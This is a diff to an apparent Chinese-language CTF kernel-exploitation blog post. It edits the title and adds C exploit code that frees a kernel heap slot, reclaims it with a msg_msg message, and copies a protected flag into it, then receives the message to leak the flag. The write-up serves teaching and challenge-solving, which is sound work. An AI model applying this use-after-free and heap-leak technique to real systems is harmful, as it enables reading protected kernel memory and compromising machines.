@@ -1,7 +1,7 @@
 ---
 layout: post
 tags: [kernel_pwn]
-title: "kernel heap 3: 内核堆利用技巧综述 2"
+title: "kernel heap 3: 内核堆利用技巧 2"
 author: wsxk
 date: 2026-7-25
 comments: true
@@ -98,6 +98,7 @@ oops脚本:<br>
 这里因为思想的进步，想到了一个可以一个脚本完成所有任务的办法:<br>
 主要利用的思想是：**内核文件交互可以是并发的，内核文件的kheap服务于所有用户；父子进程共享文件描述符的话，即使其中一个进程销毁了，其相应的文件句柄也不会被释放**<br>
 ```c
+int victim_fd; 
 int main(){
     int fd[8];
     for(int i=0;i<8;i++){   //父子进程共享，这样其中一个进程消失也不会被释放
@@ -176,7 +177,45 @@ int main(){
 这里的目标不是提权，而是获取flag，flag会放入由另一个`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`申请的slot中，不可读。<br>
 这里的目标是设法获取kernel中该slot的内容。<br>
 这就要提到[kernel heap 利用技巧: msg_msg和pipe_buffer](https://wsxk.github.io/kernel_heap_tech/)里的`msg`结构体了。<br>
+```c
+int main(){
+    char buf[1048];
 
+    pin_to_current_cpu();
+    // step 1: open_device
+    int fd = open_device(); 
+
+    // step 2: free the slot
+    free_slot(fd,buf,0x1d0);
+    
+    // step 3: make the msg use the freed slot
+    int msg_id = msg_create_queue();
+    struct message ingoing;
+    memset(ingoing.text,0x61,MESSAGE_SIZE);
+    ingoing.type = 1; // >= 0 is necessary
+    msg_send(msg_id,&ingoing,MESSAGE_SIZE,0);  // now msg
+
+    // step 4: free the msg_seg again
+    free_slot(fd,buf,0x1d0); 
+
+    // step 5: get flag to the msg_seg
+    copy_flag(fd,buf,0x1d0);
+
+    // step 6: set the next_ptr to 0
+    memset(buf,0,1048);
+    write_slot(fd,buf,8);
+
+    // step 7: recv the msg
+    struct message outgoing;
+    msg_recv(msg_id,&outgoing,MESSAGE_SIZE,0,0);
+
+    // step 8: resume the env
+    copy_flag(fd,buf,0x1d0);
+
+    memcpy(buf,outgoing.text+DATAMSG_LEN,DATAMSGSEG_LEN);
+    printf("%s\n",buf);
+}
+```
 
 
 
